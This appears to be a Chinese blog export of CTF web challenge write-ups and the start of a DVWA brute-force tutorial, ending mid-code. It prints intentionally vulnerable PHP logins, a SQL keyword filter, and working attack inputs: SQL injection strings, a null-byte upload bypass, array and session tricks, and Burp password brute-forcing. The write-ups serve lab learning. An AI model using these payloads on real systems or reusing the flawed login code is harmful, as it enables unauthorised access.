<h2 id="0x0B-后台登录"><a href="#0x0B-后台登录" class="headerlink" title="0x0B 后台登录"></a>0x0B 后台登录</h2><h3 id="题目：http-ctf5-shiyanbar-com-web-pcat-index-php"><a href="#题目：http-ctf5-shiyanbar-com-web-pcat-index-php" class="headerlink" title="题目：http://ctf5.shiyanbar.com/web/pcat/index.php"></a>题目：<a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/index.php</a></h3><h3 id="解题方法：-10"><a href="#解题方法：-10" class="headerlink" title="解题方法："></a>解题方法：</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb9.png" alt><br>查看源代码<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb38.png" alt><br>这点的意思是：原来的程序员在写网页时给自己的一个提醒是源码在这个地方，我们要查看时将source.txt复制到当前地址栏里替换index.php，然后回车<br>就能看到源码了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) &#123;</span><br><span class="line">	echo &#39;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">	echo &#39;&lt;input name&#x3D;&quot;uname&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">	echo &#39;&lt;input name&#x3D;&quot;pwd&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">	echo &#39;&lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">	echo &#39;&lt;&#x2F;form&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">	echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue&#x3D;implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;&#x2F;&quot;.$ArrReq.&quot;&#x2F;is&quot;,$StrValue)&#x3D;&#x3D;1)&#123;   </span><br><span class="line">        print &quot;姘村彲杞借垷锛屼害鍙禌鑹囷紒&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter &#x3D; &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key&#x3D;&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con &#x3D; mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">	die(&#39;Could not connect: &#39; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db&#x3D;&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM interest WHERE uname &#x3D; &#39;&#123;$_POST[&#39;uname&#39;]&#125;&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) &#x3D;&#x3D; 1) &#123; </span><br><span class="line">    $key &#x3D; mysql_fetch_array($query);</span><br><span class="line">    if($key[&#39;pwd&#39;] &#x3D;&#x3D; $_POST[&#39;pwd&#39;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;浜﹀彲璧涜墖锛�&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	print &quot;涓€棰楄禌鑹囷紒&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在这代码中有意思的地方是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$filter &#x3D; &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key&#x3D;&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他将这些sql注入的语句禁止了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM interest WHERE uname &#x3D; &#39;&#123;$_POST[&#39;uname&#39;]&#125;&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) &#x3D;&#x3D; 1) &#123; </span><br><span class="line">    $key &#x3D; mysql_fetch_array($query);</span><br><span class="line">    if($key[&#39;pwd&#39;] &#x3D;&#x3D; $_POST[&#39;pwd&#39;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;浜﹀彲璧涜墖锛�&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	print &quot;涓€棰楄禌鑹囷紒&quot;;</span><br></pre></td></tr></table></figure>
<p>这一部分的语句是说将输入进来的用户名与库里的进行对比，如果正确就输出flag，否则就会报错<br>那么接下来我们应该怎么做呢？<br>我们进行SQL注入：</p>
<p><code>&#39; or 1=1 group by pwd with rollup limit 1 offset 2 #</code></p>
<p>在这句语句中</p>
<p><code>&#39; or 1=1</code>  我们都知道这是注入的一个常用语句，异或为真，恒成立</p>
<p><code>group by pwd with rollup</code>  这句是sql里的添加一行，使得密码为空</p>
<p><code>limit 1</code> 是查询的意思，查询第一行</p>
<p><code>offset 2</code> 是从第二条数据开始查询</p>
<p>将这条语句输入到第一个框内，提交查询就可以的出flag，如果输入其他就会报错<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb39.png" alt></p>
<h2 id="0x0C-代码逆向"><a href="#0x0C-代码逆向" class="headerlink" title="0x0C 代码逆向"></a>0x0C 代码逆向</h2><h3 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h3><h3 id="解题方法：-11"><a href="#解题方法：-11" class="headerlink" title="解题方法："></a>解题方法：</h3><h2 id="0x0D-上传绕过"><a href="#0x0D-上传绕过" class="headerlink" title="0x0D 上传绕过"></a>0x0D 上传绕过</h2><h3 id="题目：http-ctf5-shiyanbar-com-web-upload"><a href="#题目：http-ctf5-shiyanbar-com-web-upload" class="headerlink" title="题目：http://ctf5.shiyanbar.com/web/upload/"></a>题目：<a href="http://ctf5.shiyanbar.com/web/upload/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/upload/</a></h3><h3 id="解题方法：-12"><a href="#解题方法：-12" class="headerlink" title="解题方法："></a>解题方法：</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb15.png" alt><br>随便上传一个1.jpg文件<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb16.png" alt><br>上传一个1.php文件<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb17.png" alt><br>显然我们上传的文件被截断了，这就让我们想到了<code>%00</code>截断。<code>%00</code>一般被认为是结束的标志，其后的东西都被认为是不存在的。抓包<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb18.png" alt><br>将上传的<code>1.php</code>文件改为<code>1.jpg</code>,在<code>/uploads/</code>后面添加<code>1.php .jpg</code>,并且在hex模块将空格所对应的十六进制<code>20</code>改为<code>00</code>，然后GO。<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb19.png" alt><br>得到flag<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb20.png" alt></p>
<h2 id="0x0E-hash函数"><a href="#0x0E-hash函数" class="headerlink" title="0x0E hash函数"></a>0x0E hash函数</h2><h3 id="题目：http-ctf5-shiyanbar-com-web-false-php"><a href="#题目：http-ctf5-shiyanbar-com-web-false-php" class="headerlink" title="题目：http://ctf5.shiyanbar.com/web/false.php"></a>题目：<a href="http://ctf5.shiyanbar.com/web/false.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/false.php</a></h3><h3 id="解题方法：-13"><a href="#解题方法：-13" class="headerlink" title="解题方法："></a>解题方法：</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb45.png" alt><br>查看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">    if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class="line">        echo &#39;&lt;p&gt;Your password can not be your name!&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">    else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))</span><br><span class="line">      die(&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &#39;&lt;p&gt;Invalid password.&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo &#39;&lt;p&gt;Login first!&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码的意思就是，输入的<code>name</code>和<code>password</code>经过sha1()函数加密后相等，但二者不一样。<br>应该利用<code>false===false</code>，md5 和 sha1 无法处理数组，但是 php 没有抛出异常，直接返回 fasle<br>payload：<code>?name[]=1&amp;password[]=123</code><br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb46.png" alt></p>
<h2 id="0x0F-备份文件"><a href="#0x0F-备份文件" class="headerlink" title="0x0F 备份文件"></a>0x0F 备份文件</h2><h3 id="题目：http-ctf5-shiyanbar-com-10-upload-step1-php"><a href="#题目：http-ctf5-shiyanbar-com-10-upload-step1-php" class="headerlink" title="题目：http://ctf5.shiyanbar.com/10/upload/step1.php"></a>题目：<a href="http://ctf5.shiyanbar.com/10/upload/step1.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/10/upload/step1.php</a></h3><h3 id="解题方法：-14"><a href="#解题方法：-14" class="headerlink" title="解题方法："></a>解题方法：</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb25.png" alt><br>我们先输入一个邮箱试试，发现不行<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb27.png" alt><br>查看源代码<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb26.png" alt><br>我们发现了管理员邮箱，也知道了这是用vim写的文件。<br>哎，我们刚才还发现了一个<code>step2.php</code>,试试。<br>结果页面一闪而过，嗯，有猫腻，抓包。<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb28.png" alt><br>抓到一个<code>submit.php</code>,试试，不行。<br>用过Linux的vim的都知道，vim会产生一个临时文件<code>.submit.php.swp</code>。这是一个隐藏文件。<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb29.png" alt><br>这段代码是说，我们需要传入<code>token</code>和<code>emailAddress</code>，<code>token</code>必须长度为10，大小为0，可令<code>token=0000000000</code>，或用科学计数法，正好，我们刚才发现一个管理员邮箱。<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb30.png" alt></p>
<h2 id="0x11-验证码"><a href="#0x11-验证码" class="headerlink" title="0x11 验证码"></a>0x11 验证码</h2><h3 id="题目：-4"><a href="#题目：-4" class="headerlink" title="题目："></a>题目：</h3><h3 id="解题方法：-15"><a href="#解题方法：-15" class="headerlink" title="解题方法："></a>解题方法：</h3><h2 id="0x12-cookie"><a href="#0x12-cookie" class="headerlink" title="0x12 cookie"></a>0x12 cookie</h2><h3 id="题目：http-ctf5-shiyanbar-com-web-Session-php"><a href="#题目：http-ctf5-shiyanbar-com-web-Session-php" class="headerlink" title="题目：http://ctf5.shiyanbar.com/web/Session.php"></a>题目：<a href="http://ctf5.shiyanbar.com/web/Session.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/Session.php</a></h3><h3 id="解题方法：-16"><a href="#解题方法：-16" class="headerlink" title="解题方法："></a>解题方法：</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb42.png" alt><br>查看源代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">session_start(); </span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">    if ($_GET[&#39;password&#39;] &#x3D;&#x3D; $_SESSION[&#39;password&#39;])</span><br><span class="line">        die (&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &#39;&lt;p&gt;Wrong guess.&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码的关键就在于：<code>password = $_session[&#39;password&#39;]</code><br>Cookie与 Session，一般都会认为这是两个独立完全不同的东西，Session采用的是在服务器端保持状态的方案，而Cookie采用的是在客户端保持状态的方案。在PHP配置中的默认情况下，Session是用Session ID来确定当前对话所对应的服务器Session，而Session ID是通过Cookie来传递的，禁用Cookie相当于失去了Session ID，也就得不到Session了。</p>
<p>用Burpsuite抓包</p>
<p>从抓包的内容中我们就能看见在Cookie中已经是包含了Sessid，并且发送的password在URL中以Get的方式传值。<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb43.png" alt><br>那这里我们就可以以这样的思路来求解。首先我们删除所有的Cookie，将PHPSessid值直接删掉，这样的结果就会使得<code>$_session[&#39;password&#39;]</code>值为空，接下来我们将URL中的password值清空，这样我们就能达到<code>password = $_session[&#39;password&#39;]</code>的效果。<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb44.png" alt></p>
<h2 id="0x13-MD5碰撞"><a href="#0x13-MD5碰撞" class="headerlink" title="0x13 MD5碰撞"></a>0x13 MD5碰撞</h2><h3 id="题目：http-ctf5-shiyanbar-com-web-kzhan-php"><a href="#题目：http-ctf5-shiyanbar-com-web-kzhan-php" class="headerlink" title="题目：http://ctf5.shiyanbar.com/web/kzhan.php"></a>题目：<a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/kzhan.php</a></h3><h3 id="解题方法：-17"><a href="#解题方法：-17" class="headerlink" title="解题方法："></a>解题方法：</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb31.png" alt><br>随便输入一些东西，发现什么都没有，抓包<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb32.png" alt><br>哎，我们发现有一个<code>source=0</code>,改成<code>source=1</code>试试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$flag &#x3D; &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;</span><br><span class="line">$secret &#x3D; &quot;XXXXXXXXXXXXXXX&quot;; &#x2F;&#x2F; This secret is 15 characters long for security!</span><br><span class="line"></span><br><span class="line">$username &#x3D; $_POST[&quot;username&quot;];</span><br><span class="line">$password &#x3D; $_POST[&quot;password&quot;];</span><br><span class="line"></span><br><span class="line">if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;</span><br><span class="line">    if (urldecode($username) &#x3D;&#x3D;&#x3D; &quot;admin&quot; &amp;&amp; urldecode($password) !&#x3D; &quot;admin&quot;) &#123;</span><br><span class="line">        if ($COOKIE[&quot;getmein&quot;] &#x3D;&#x3D;&#x3D; md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">            die (&quot;The flag is &quot;. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die (&quot;You are not an admin! LEAVE.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&quot;source&quot;])) &#123;</span><br><span class="line">    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if ($_COOKIE[&quot;source&quot;] !&#x3D; 0) &#123;</span><br><span class="line">        echo &quot;&quot;; &#x2F;&#x2F; This source code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>源代码出来了。<br>想要获得flag，需要满足几个条件：<br>1.<code>urldecode($username) === &quot;admin&quot;</code></p>
<p>2.<code>urldecode($password) != &quot;admin&quot;</code></p>
<p>3.<code>$COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))</code><br>其中$secret是长度为15的未知字符串，而条件1、2很好满足，条件3则需要进行哈希长度扩展攻击来满足关于什么是哈希长度扩展攻击，怎么进行的可以看下面这个链接：<a href="https://github.com/iagox86/hash_extender" target="_blank" rel="noopener">https://github.com/iagox86/hash_extender</a></p>
<p>在<code>cookie</code>中可以看到<code>sample-hash=571580b26c65f306376d4f64e53cb5c7</code>，<br>这是<code>$secret</code>跟两个admin连接后的字符串的哈希值，<code>md5(???????????????adminadmin)</code>，新字符串长度为25。我们要提交的username必定为admin，也就是说，我们提交的getmein必须是$secret跟admin以及$password连接后的字符串的哈希值。</p>
<h2 id="0x14-总结"><a href="#0x14-总结" class="headerlink" title="0x14 总结"></a>0x14 总结</h2><p>遇到不会的函数可以自己百度</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA之Brute Force</title>
    <url>/posts/29339.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击。<br>![](DVWA之Brute Force/Force1.jpg)</p>
<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get username</span><br><span class="line">    $user &#x3D; $_GET[ &#39;username&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get password</span><br><span class="line">    $pass &#x3D; $_GET[ &#39;password&#39; ];</span><br><span class="line">    $pass &#x3D; md5( $pass );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check the database</span><br><span class="line">    $query  &#x3D; &quot;SELECT * FROM &#96;users&#96; WHERE user &#x3D; &#39;$user&#39; AND password &#x3D; &#39;$pass&#39;;&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">    if( $result &amp;&amp; mysqli_num_rows( $result ) &#x3D;&#x3D; 1 ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Get users details</span><br><span class="line">        $row    &#x3D; mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar &#x3D; $row[&quot;avatar&quot;];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Login successful</span><br><span class="line">        echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;\&quot;&#123;$avatar&#125;\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; Login failed</span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br &#x2F;&gt;Username and&#x2F;or password incorrect.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res &#x3D; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>isset</code>函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即<code>true/false</code><br>可以看到，服务器只是验证了参数<code>Login</code>是否被设置，没有任何的防爆破机制，且对参数<code>username</code>、<code>password</code>没有做任何过滤，存在明显的sql注入漏洞。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="方法一：Burpsuite爆破"><a href="#方法一：Burpsuite爆破" class="headerlink" title="方法一：Burpsuite爆破"></a>方法一：Burpsuite爆破</h4><ul>
<li><p>抓包<br>![](DVWA之Brute Force/Force1.jpg)</p>
</li>
<li><p>Send to Intruder<br>![](DVWA之Brute Force/Force2.jpg)</p>
</li>
<li><p>对password参数进行爆破<br>![](DVWA之Brute Force/Force4.jpg)</p>
</li>
<li><p>选中Payloads，载入字典，点击Start attack进行爆破<br>![](DVWA之Brute Force/Force3.jpg)</p>
<p>可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成</p>
<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4></li>
</ul>
<ol>
<li>username：admin’ or ‘1’=’1<br>password：(空)<br>![](DVWA之Brute Force/Force5.jpg)  </li>
<li>username：admin’ #<br>password：(空)<br>![](DVWA之Brute Force/Force6.jpg)<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2></li>
</ol>
<h3 id="核心代码-1"><a href="#核心代码-1" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Sanitise username input</span><br><span class="line">    $user &#x3D; $_GET[ &#39;username&#39; ];</span><br><span class="line">    $user &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sanitise password input</span><br><span class="line">    $pass &#x3D; $_GET[ &#39;password&#39; ];</span><br><span class="line">    $pass &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass &#x3D; md5( $pass );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check the database</span><br><span class="line">    $query  &#x3D; &quot;SELECT * FROM &#96;users&#96; WHERE user &#x3D; &#39;$user&#39; AND password &#x3D; &#39;$pass&#39;;&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">    if( $result &amp;&amp; mysqli_num_rows( $result ) &#x3D;&#x3D; 1 ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Get users details</span><br><span class="line">        $row    &#x3D; mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar &#x3D; $row[&quot;avatar&quot;];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Login successful</span><br><span class="line">        echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;\&quot;&#123;$avatar&#125;\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; Login failed</span><br><span class="line">        sleep( 2 );</span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br &#x2F;&gt;Username and&#x2F;or password incorrect.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res &#x3D; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击，说基本上是因为查到说 MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义（因实验环境的MySQL版本较新，所以并未做相应验证）；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，依然没有加入有效的防爆破机制。</p>
<p>具体的mysql_real_escape_string函数绕过问题详见：<br><a href="http://blog.csdn.net/hornedreaper1988/article/details/43520257" target="_blank" rel="noopener">http://blog.csdn.net/hornedreaper1988/article/details/43520257</a></p>
<p><a href="http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html" target="_blank" rel="noopener">http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html</a></p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然sql注入不再有效，但依然可以使用Burpsuite进行爆破，与Low级别的爆破方法基本一样，这里就不赘述了。</p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="核心代码-2"><a href="#核心代码-2" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sanitise username input</span><br><span class="line">    $user &#x3D; $_GET[ &#39;username&#39; ];</span><br><span class="line">    $user &#x3D; stripslashes( $user );</span><br><span class="line">    $user &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sanitise password input</span><br><span class="line">    $pass &#x3D; $_GET[ &#39;password&#39; ];</span><br><span class="line">    $pass &#x3D; stripslashes( $pass );</span><br><span class="line">    $pass &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass &#x3D; md5( $pass );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database</span><br><span class="line">    $query  &#x3D; &quot;SELECT * FROM &#96;users&#96; WHERE user &#x3D; &#39;$user&#39; AND password &#x3D; &#39;$pass&#39;;&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) 